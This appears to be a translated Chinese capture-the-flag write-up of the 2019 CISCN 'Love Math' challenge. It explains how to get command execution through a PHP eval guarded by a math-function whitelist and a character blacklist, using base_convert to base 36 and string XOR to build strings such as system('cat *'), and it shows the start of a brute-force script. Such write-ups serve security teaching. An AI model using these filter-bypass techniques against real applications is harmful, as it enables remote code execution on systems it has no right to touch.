# php利用math函数rce总结
##### 译文声明
本文是翻译文章
译文仅供参考，具体内容表达以及含义原文为准。
## 0x00 前言
由 2019 国赛 love math 而来，国赛题目质量一直可以的，“数学题”近年来也不少，比如今年护网杯，但网上一些博客写得不够基础，比如 php
异或的原理是什么？为什么两个字符串异或会得到这个？完全没有解答。
写这篇文章的目的，就是从基础层面上，收集师傅们的各种解题方法来总的分析一下—— php 怎么利用数学函数来代码执行。
## 0x01 题解
###  Love Math
    = 80) {
            die("太长了不会算");
        }
        //ban 了单双反引号，不能直接利用 eval 命令执行
        $blacklist = [' ', '\t', '\r', '\n','\'', '"', '`', '\[', '\]'];
        foreach ($blacklist as $blackitem) {
            if (preg_match('/' . $blackitem . '/m', $content)) {
                die("请不要输入奇奇怪怪的字符");
            }
        }
        //常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp
        $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];
        preg_match_all('/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/', $content, $used_funcs);  
        foreach ($used_funcs[0] as $func) {
            if (!in_array($func, $whitelist)) {
                die("请不要输入奇奇怪怪的函数");
            }
        }
        //帮你算出答案
        eval('echo '.$content.';');
    }
get 传参 c ，长度限制 80 ，有黑白名单，简而言之，要求你构造一个用白名单函数，又不包括黑名单符号的 payload 来命令执行。
白名单中数学函数分两种利用方法，进制转换和异或，旨在调用 **能返回字符串** 的数学函数达到命令执行的目的。
* * *
###  数学函数的利用
####  进制转换函数
这里参考了 [N0rths 一血师傅的博客](https://northity.com/2019/04/23/CISCN2019Web-WP/#love-math)
白名单里进制转换的函数：
    'base_convert', 'bindec', 'decbin', 'dechex', 'hexdec', 'decoct','octdec'
函数解释：
> `base_convert(number,frombase,tobase)`
>
> 在任意进制之间转换数字。
>
> `dechex(dec_number)`
>
> 把十进制转换为十六进制。返回一个字符串，包含有给定 _binary_string_ 参数的十六进制表示。所能转换的最大数值为十进制的
> 4294967295，其结果为 “ffffffff”。
>
> `hexdec(hex_string)`
>
> 把十六进制转换为十进制。返回与 _hex_string_ 参数所表示的十六进制数等值的的十进制数。
>
> 其他的 `decbin` `decbin` `decoct` `octdec` 同上，分别是二进制、八进制与十进制的互转。
十六进制的字母范围只有 a-f ，显然是不符合我们构造的要求，而三十六进制字母范围正好为 a-z 。
而 `base_convert` 正好能在任意进制转换数字，这样我们传入十进制的数字，使其转换为三十六进制时，返回的字符串是我们想要的 `cat`
等命令就行了。
反过来构造，例如：
    echo base_convert("cat",36,10);
    //15941
但这里，虽然可以构造纯字母字符串了，但进制转换显然不能返回 `.` `/` `*` 等特殊字符，而这就需要用到另一类运算函数。
####  运算函数
比如我们要构造 `system('cat *')`
那么我们需要返回 `空格*` 这样的函数，而 php 中函数名默认为字符串，可以进行异或。
> [php 异或](https://www.php.net/manual/zh/language.operators.bitwise.php)
>
> php 中异或运算符 `^` 是位运算符，如果进行运算的都是数字的话：
>
> 
>
> 将会先转换为二进制来按位异或，比如：
>  
>  
>     echo 12 ^ 9; // Outputs '5'
>  
>
> 但如果进行运算的有字符串呢？
>  
>  
>     echo "12" ^ "9"; // Outputs the Backspace character (ascii 8)
>                   // ('1' (ascii 49)) ^ ('9' (ascii 57)) = #8
>
>     echo "hallo" ^ "hello"; // Outputs the ascii values #0 #4 #0 #0 #0
>                          // 'a' ^ 'e' = #4
>
>     echo 2 ^ "3"; // Outputs 1
>                // 2 ^ ((int)"3") == 1
>
>     echo "2" ^ 3; // Outputs 1
>                // ((int)"2") ^ 3 == 1
>  
>
> 长度一致时，会先把字符串按位转换为 ascii 码，再将 ascii 码转换为二进制进行按位异或，最后输出 ascii 为异或结果的字符。
>
> 长度不一致时，按最短的字符串长度按位异或，比如 `"12" ^ "9"` 的例子。
>
> 按位异或运算的几个性质：
>
>   1. 结合律a ^ b ^ c = a ^ c ^ b
>   2. 交换律a ^ b = b ^ a
>   3. 数值交换（能交换 a 与 b 的值）a = a ^ b; b = a ^ b; a = a ^ b;
>
>
> 而我们要构造有 `空格*` 该怎么利用异或呢？
>
> 由上面的性质 1 其实就已经明确了，`"a"^"a"` 结果是多少呢？相同即 0 ，也就是说，其 ascii 全 0 ，ascii 全 0
> 按位异或，得到的不就完全是另外一个 ascii 码吗，换言之，`"a"^"x"^"a"` 无论怎么调换顺序，输出的都是 x 的ascii 码 120
> ，无论 x 被替换为什么，都是一样的结果。
>
> 这也是 N0rths 师傅在博客中写的脚本中是 `echo $k^$i^" *";` 的原因，想得到 `空格*` 就找 `k` 和 `i`
> 能异或出另外一个数学函数 `dechex` 构造的值，取的值自然是我们这里的白名单函数，前面说过，函数名默认为字符串。
师傅的爆破脚本
    <?php
    $whitelist = ['abs', 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh'];
    $whitelist2 = [ 'acos', 'acosh', 'asin', 'asinh', 'atan2', 'atan', 'atanh', 'base_convert', 'bindec', 'ceil', 'cos', 'cosh', 'decbin', 'dechex', 'decoct', 'deg2rad', 'exp', 'expm1', 'floor', 'fmod', 'getrandmax', 'hexdec', 'hypot', 'is_finite', 'is_infinite', 'is_nan', 'lcg_value', 'log10', 'log1p', 'log', 'max', 'min', 'mt_getrandmax', 'mt_rand', 'mt_srand', 'octdec', 'pi', 'pow', 'rad2deg', 'rand', 'round', 'sin', 'sinh', 'sqrt', 'srand', 'tan', 'tanh','abs'];
    foreach ($whitelist as $i):
        foreach ($whitelist2 as $k):
        echo $k^$i^" *";
        echo "   " . $i . " " . $k;